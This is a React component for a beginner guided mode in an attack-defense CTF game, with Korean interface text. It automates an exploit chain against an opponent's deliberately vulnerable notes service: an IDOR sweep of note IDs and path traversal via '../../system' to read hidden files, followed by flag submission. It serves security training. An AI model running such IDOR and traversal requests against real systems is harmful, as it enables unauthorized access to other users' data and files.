import { useCallback, useEffect, useMemo, useState } from "react";
import { sendTargetRequest, submitCapturedFlag, targetBaseUrl, type AttackTarget, type Session } from "./api";
import {
  extractToken, findFlag, guidedCredentials, missionForTarget, noteSweepIds,
  parseEntries, systemFilePath, type GuidedMission,
} from "./guided";

type StepStatus = "todo" | "active" | "done";
interface LogLine { label: string; detail: string; ok: boolean }

// One state bag per selected target so switching targets keeps progress.
interface RunState {
  index: number;             // current step pointer
  token: string;             // auto-captured bearer token
  flag: string;              // captured FLAG
  submitted: boolean;        // accepted by the game engine
  entries: string[];         // vault: discovered system files
  log: LogLine[];
  creds: { username: string; password: string };
  busy: boolean;
  error: string;
}

function freshRun(): RunState {
  return {
    index: 0, token: "", flag: "", submitted: false, entries: [], log: [],
    creds: guidedCredentials(), busy: false, error: "",
  };
}

export function GuidedMode({ target, session, onFlagAccepted }: {
  target: AttackTarget | null;
  session: Session;
  onFlagAccepted: () => Promise<void> | void;
}) {
  const mission = useMemo<GuidedMission>(() => missionForTarget(target?.service_slug), [target?.service_slug]);
  const runsKey = target ? `${target.team_id}:${target.service_id}` : "";
  const [runs, setRuns] = useState<Record<string, RunState>>({});

  const update = useCallback((patch: Partial<RunState> | ((prev: RunState) => Partial<RunState>)) => {
    setRuns((all) => {
      const prev = all[runsKey] ?? freshRun();
      const next = typeof patch === "function" ? patch(prev) : patch;
      return { ...all, [runsKey]: { ...prev, ...next } };
    });
  }, [runsKey]);

  // Seed a fresh mission the first time a target is selected.
  useEffect(() => {
    if (runsKey && !runs[runsKey]) setRuns((all) => ({ ...all, [runsKey]: freshRun() }));
  }, [runsKey, runs]);

  const run = runs[runsKey] ?? freshRun();

  const append = useCallback((label: string, detail: string, ok = true) =>
    update((prev) => ({ log: [...prev.log, { label, detail, ok }] })), [update]);

  const advance = useCallback(() =>
    update((prev) => ({ index: Math.min(prev.index + 1, mission.steps.length) })), [update, mission.steps.length]);

  async function performStep(stepId: string, current: RunState) {
    if (!target) return;
    const { username, password } = current.creds;
    const cred = JSON.stringify({ username, password });
    const call = (method: string, path: string, body: string, useToken: boolean) =>
      sendTargetRequest(target, method, path, useToken ? current.token : "", body);

    if (stepId === "register") {
      const res = await call("POST", "/api/register", cred, false);
      append("REGISTER", `HTTP ${res.status} · 계정 '${username}' 생성`, res.status < 400);
      advance();
    } else if (stepId === "login") {
      const res = await call("POST", "/api/login", cred, false);
      const token = extractToken(res.body);
      if (!token) throw new Error(`로그인 실패 (HTTP ${res.status}). 먼저 계정을 생성했는지 확인하세요.`);
      append("LOGIN", `HTTP ${res.status} · access token 자동 설정됨 (${token.slice(0, 12)}…)`, true);
      update({ token });
      advance();
    } else if (stepId === "explore") {
      for (const id of noteSweepIds()) {
        const res = await call("GET", `/api/notes/${id}`, "", true);
        const flag = findFlag(res.body);
        if (flag) {
          append("IDOR", `/api/notes/${id} → 다른 사용자의 노트에서 FLAG 발견!`, true);
          update({ flag });
          advance();
          return;
        }
      }
      append("IDOR", "노트를 훑었지만 FLAG를 찾지 못했습니다. 다시 시도하거나 다른 대상을 선택하세요.", false);
    } else if (stepId === "discover") {
      const res = await call("GET", "/api/files?path=../../system", "", true);
      const entries = parseEntries(res.body);
      const inlineFlag = findFlag(res.body);
      if (entries.length === 0) {
        append("DISCOVER", `HTTP ${res.status} · 디렉터리 목록을 받지 못했습니다.`, false);
        return;
      }
      append("DISCOVER",
        `path=../../system → 숨겨진 파일 ${entries.length}개 노출: ${entries.slice(0, 4).join(", ")}${entries.length > 4 ? " …" : ""}`,
        true);
      update({ entries, ...(inlineFlag ? { flag: inlineFlag } : {}) });
      advance();
    } else if (stepId === "read") {
      for (const name of current.entries) {
        const res = await call("GET", `/api/files?path=${systemFilePath(name)}`, "", true);
        const flag = findFlag(res.body);
        if (flag) {
          append("READ", `${name} → 파일 내용에서 FLAG 발견!`, true);
          update({ flag });
          advance();
          return;
        }
      }
      append("READ", "탐색된 파일에서 FLAG를 찾지 못했습니다.", false);
    } else if (stepId === "capture") {
      if (!current.flag) throw new Error("아직 FLAG를 획득하지 못했습니다.");
      append("CAPTURE", `FLAG 확보: ${current.flag}`, true);
      advance();
    } else if (stepId === "submit") {
      const result = await submitCapturedFlag(session.match_id, session.access_token, current.flag);
      if (result.accepted) {
        append("SUBMIT", `FLAG 제출 성공 · +${result.score_delta ?? 0} ATTACK 🎉`, true);
        update({ submitted: true });
        advance();
        await onFlagAccepted();
      } else {
        append("SUBMIT", `제출이 거절되었습니다 (inactive/중복/자기팀/무효): ${result.reason ?? result.status}`, false);
      }
    }
  }

  async function runStep() {
    const step = mission.steps[run.index];
    if (!step || run.busy) return;
    update({ busy: true, error: "" });
    try {
      await performStep(step.id, run);
    } catch (reason) {
      update({ error: String(reason) });
      append(step.id.toUpperCase(), String(reason), false);
    } finally {
      update({ busy: false });
    }
  }

  function reset() {
    setRuns((all) => ({ ...all, [runsKey]: freshRun() }));
  }

  if (!target) {
    return (
      <section className="p-6 md:p-10 text-center text-[#9b737b]">
        <div className="font-mono text-[10px] tracking-[0.2em] text-[#FB7185]">BEGINNER · GUIDED MODE</div>
        <h1 className="text-2xl mt-2 mb-2 text-[#f3e9eb]">공격할 상대 서비스를 선택하세요</h1>
        <p className="text-sm">왼쪽 목록에서 <strong>Team 02 · Vulnerable Notes</strong> 를 먼저 고르면 단계별 가이드가 시작됩니다.</p>
      </section>
    );
  }

  const currentStep = mission.steps[run.index];
  const complete = run.index >= mission.steps.length;

  return (
    <section className="p-4 md:p-6 min-w-0">
      <div className="flex flex-wrap items-start justify-between gap-3 mb-4">
        <div>
          <span className="font-mono text-[10px] tracking-widest text-[#FB7185]">{mission.code} · GUIDED</span>
          <h1 className="text-2xl mt-1">{target.team} · {target.service}</h1>
          <p className="text-sm text-[#bea7ac] mt-1 max-w-xl">{mission.objective}</p>
          <code className="text-[10px] text-[#6f555a]">{targetBaseUrl(target)}</code>
        </div>
        <button onClick={reset} className="border border-[#382127] rounded px-3 py-2 text-[10px] text-[#9b737b]">↺ 미션 재시작</button>
      </div>

      <ol className="grid gap-2 mb-4">
        {mission.steps.map((step, index) => {
          const status: StepStatus = index < run.index ? "done" : index === run.index ? "active" : "todo";
          const isCurrent = status === "active" && !complete;
          return (
            <li key={step.id} className={`rounded-lg border p-3 ${
              status === "done" ? "border-[#34D399]/50 bg-[#34D399]/5"
              : isCurrent ? "border-[#FB7185] bg-[#FB7185]/10"
              : "border-[#2a1a1c] bg-[#120c0e] opacity-70"}`}>
              <div className="flex items-center gap-3">
                <span className={`w-6 h-6 shrink-0 grid place-items-center rounded-full font-mono text-[11px] border ${
                  status === "done" ? "border-[#34D399] bg-[#34D399] text-[#08090d]"
                  : isCurrent ? "border-[#FB7185] text-[#FB7185]" : "border-[#382127] text-[#6f555a]"}`}>
                  {status === "done" ? "✓" : index + 1}
                </span>
                <div className="min-w-0 flex-1">
                  <div className="flex items-center justify-between gap-2">
                    <strong className="text-sm">{step.title}</strong>
                    <span className="font-mono text-[9px] tracking-widest text-[#9b737b]">
                      {status === "done" ? "완료" : isCurrent ? "지금 할 일" : `Step ${index + 1}/${mission.steps.length}`}
                    </span>
                  </div>
                  {isCurrent && <p className="text-xs text-[#bea7ac] mt-1 leading-6">{step.why}</p>}
                </div>
              </div>
              {isCurrent && (
                <div className="mt-3 pl-9">
                  <button disabled={run.busy} onClick={runStep}
                    className="border border-[#FB7185] bg-[#FB7185]/15 rounded px-4 py-2 text-[#FB7185] font-mono text-xs tracking-wider disabled:opacity-50">
                    {run.busy ? "실행 중…" : step.action}
                  </button>
                  {run.error && <span role="alert" className="ml-3 text-[10px] text-[#FB7185]">{run.error}</span>}
                </div>
              )}
            </li>
          );
        })}
      </ol>

      {complete && (
        <div className="rounded-lg border border-[#34D399]/60 bg-[#34D399]/10 p-4 mb-4 text-center">
          <div className="font-mono text-[10px] tracking-widest text-[#34D399]">MISSION COMPLETE</div>
          <h2 className="text-lg mt-1">{mission.name} 성공 🎉</h2>
          <p className="text-xs text-[#bea7ac] mt-1">START HERE 화면으로 돌아가면 진행 상태가 다음 단계로 넘어갑니다.</p>
        </div>
      )}

      {run.flag && !run.submitted && currentStep?.id !== "submit" && (
        <div className="rounded-lg border border-[#5a2933] bg-[#140c0f] p-3 mb-4">
          <span className="font-mono text-[10px] tracking-widest text-[#FB7185]">FLAG DETECTED</span>
          <code className="block mt-1 text-sm break-all">{run.flag}</code>
        </div>
      )}

      <section className="border border-[#2a1a1c] rounded-lg bg-[#070608] overflow-hidden">
        <div className="px-3 py-2 border-b border-[#2a1a1c] font-mono text-[10px] text-[#9b737b]">ACTIVITY LOG · 실제 요청 기록</div>
        {run.log.length === 0
          ? <div className="p-4 text-xs text-[#6f555a]">각 단계 버튼을 누르면 실제 대상 서비스로 보낸 요청과 결과가 여기에 기록됩니다.</div>
          : <ul className="m-0 p-0 list-none">
              {run.log.map((line, i) => (
                <li key={i} className="grid grid-cols-[70px_1fr] gap-2 px-3 py-2 border-b border-[#160f11] text-xs">
                  <span className={`font-mono ${line.ok ? "text-[#34D399]" : "text-[#FB7185]"}`}>{line.label}</span>
                  <span className="text-[#cdbcc0] break-all">{line.detail}</span>
                </li>
              ))}
            </ul>}
      </section>
    </section>
  );
}
